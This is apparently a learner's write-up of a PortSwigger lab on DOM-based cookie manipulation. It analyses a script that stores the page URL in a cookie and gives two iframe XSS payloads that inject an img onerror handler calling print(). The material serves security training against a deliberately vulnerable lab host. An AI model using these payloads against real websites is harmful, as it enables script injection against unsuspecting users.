# [Lab: DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)

## Lab

This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the `print()` function. You will need to use the exploit server to direct the victim to the correct pages.

## Analysis

Find scripts:

- `/product?productId=xxx`:

  ```js
  <script>
      document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
  </script>
  ```

logic:

- access to `/product?productId=xxx` => `http://.../product?productId=xxx` is saved to cookie
- depends on the cookie, the server create a `lastViewedProduct` link in response.

## Solutions

craft a response at exploit server:

- body:

  ```js
  <iframe src="https://id.web-security-academy.net/product?productId=5&%27%3E%3Cimg%20src=1%20onerror=print()%3E" onload=reload()></iframe>
  ```

- view exploit => it's worked, but the lab is still not solved.

solution 2, craft a response at exploit server:

- body:

  ```js
  <iframe src="https://id.web-security-academy.net/product?productId=1&'><img src=1 onerror=print()>" onload="if(!window.x)this.src='https://id.web-security-academy.net';window.x=1;">
  ```
